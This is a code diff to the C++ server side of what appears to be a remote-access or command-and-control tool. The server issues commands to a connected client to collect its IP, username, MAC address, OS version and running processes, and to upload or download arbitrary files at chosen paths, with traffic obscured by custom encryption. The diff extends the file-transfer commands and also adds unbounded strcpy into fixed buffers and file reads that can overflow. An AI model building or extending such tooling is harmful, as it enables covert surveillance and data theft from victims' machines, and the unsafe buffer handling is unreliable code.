@@ -22,9 +22,8 @@
 #include <cctype>
 #include <vector>
 #include <cmath>
-#define MAX 512
+#define MAX 1024
 #define PORT "8080"
-#define SA struct sockaddr
 #define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
 
 #pragma comment(lib, "WS2_32")
@@ -159,7 +158,7 @@ std::string decrypt(const std::string &input) {
 }
    
 // Function designed for chat between client and server.
-int func(SOCKET connfd)
+void func(SOCKET connfd)
 {
     char buff[MAX];
     int n;
@@ -175,34 +174,26 @@ int func(SOCKET connfd)
         // copy server message in the buffer
         while ((buff[n++] = getchar()) != '\n')
             ;
-
-        // if (strstr(buff, "UPLOAD")) {
-        //     // char* token = strtok(buff, " ");
-        //     // token = strtok(NULL, " ");
-        //     // strcpy(filename, token);
-        //     // filename[strlen(filename)-1] = '\0';
-        //     filename = "fromclient.txt";
-        // }
         if(strncmp("EXIT", buff, 4) == 0) {
             exit = true;
         }
+        strncpy(before, buff, sizeof(buff));
         if (strstr(buff, "DOWNLOAD")) {
-            char* token = strtok(buff, " ");
-            token = strtok(NULL, " ");
-            char downloadFile[20];
+            char* token = strtok(before, " ");
+            token = strtok(NULL, " "); // download from
+            char downloadFile[100];
             strcpy(downloadFile, token);
-            downloadFile[strlen(downloadFile)-1] = '\0';
+            //downloadFile[strlen(downloadFile)-1] = '\0';
+            cout << "file path download from " << downloadFile << endl;
             FILE* file;
-            char fileContent[512];
+            char fileContent[1024];
             if ((file = fopen(downloadFile, "r")) == NULL) {
                 cout << "File Not Found on Server!\n" << endl;
-                return 0;
             }
             fseek(file, 0, SEEK_END);
             long len = ftell(file);
             fseek(file, 0, SEEK_SET);
             bzero(fileContent, MAX);
-            // char fileContents[len];
             fread(fileContent, 1, len, file);
             fclose(file);
 
@@ -210,18 +201,20 @@ int func(SOCKET connfd)
             char n = '\n';
             strncat(buff, &n, 1);
             strcat(buff, fileContent);
-            // send(connfd, buff, sizeof(buff), 0); // buff might be too small for files
         }
 
-        strncpy(before, buff, sizeof(buff));
         printf("buffer: %s\n", before);
         string encryptedBuff = encrypt(string(buff));
         strncpy(buff, encryptedBuff.c_str(), encryptedBuff.size());
         buff[encryptedBuff.size()] = '\0';
         printf("\nencrypted buffer: %s", buff);
 
+        string decryptedBuff2 = decrypt(string(before));
+        // THIS IS WHERE SOME WEIRD ERROR IS SOMETIMES HAPPENING?
+        cout << "decrypted buff: " << decryptedBuff2 << endl;
+
         // and send that buffer to client
-        send(connfd, buff, sizeof(buff), 0); // buff might be too small for files
+        send(connfd, buff, sizeof(buff), 0);
 
         // if msg contains "Exit" then server exit and chat ended.
         if (exit) {
@@ -235,20 +228,17 @@ int func(SOCKET connfd)
         strncpy(buff, decryptedBuff.c_str(), decryptedBuff.size());
         buff[decryptedBuff.size()] = '\0';
 
-        if (strstr(before, "RUNNING PROCESSES")) {
-            cout << "Received Process List:" << buff << endl;
-        }
-
-        // get file contents to new file 
-        // if the given command is upload, the server should receive only the file's
-        // content from the client and will send the command to the client as received
-        // from the user on the server.
         if (strstr(before, "UPLOAD")) {
+            char* token = strtok(before, " ");
+            token = strtok(NULL, " "); // upload from
+            token = strtok(NULL, " "); // upload to
+            char path[100];
+            strcpy(path, token);
+            path[strlen(path)-1] = '\0';
+            cout << "file path to upload to: " << path << endl;
             FILE * file;
-            char filename[20] = "fromclient.txt";
-            if ((file = fopen(filename, "w")) == NULL) {
+            if ((file = fopen(path, "w")) == NULL) {
                 cout << "unable to create file on server!\n" << endl;
-                return 0;
             }
             fputs(buff, file);
             cout << "\nfile contents received: " << buff << endl;
@@ -259,7 +249,6 @@ int func(SOCKET connfd)
         cout << "\nClient's response:\n" << buff << endl;
         bzero(buff, MAX);
     }
-    return 0;
 }
 
 // Driver function
@@ -343,9 +332,9 @@ int main()
     cout << "\nInformation to get from client:\n\tIPADDRESS : this will gather the client's IP Addess\n\t"
         "USERNAME : this will gather the client's username\n\tMACADDRESS : this will gather the client's " 
         "MAC Address\n\tOS VERSION : this will gather the client's Operating System\n\tRUNNING PROCESSES : this will "
-        "list out the client's running processes\n\tUPLOAD <file path> : this will upload a file to the "
-        "client\n\tDOWNLOAD <file path> : this will download a file from the client\n\tEXIT: close the "
-        "server socket\n\n" << endl;
+        "list out the client's running processes\n\tUPLOAD <upload_from_path> <upload_to_path> : this will upload"
+        " a file to the client\n\tDOWNLOAD <download_from_path> <download_to_path> : this will download a file from "
+        "the client\n\tEXIT: close the server socket\n\n" << endl;
 
     func(ClientSocket);
 
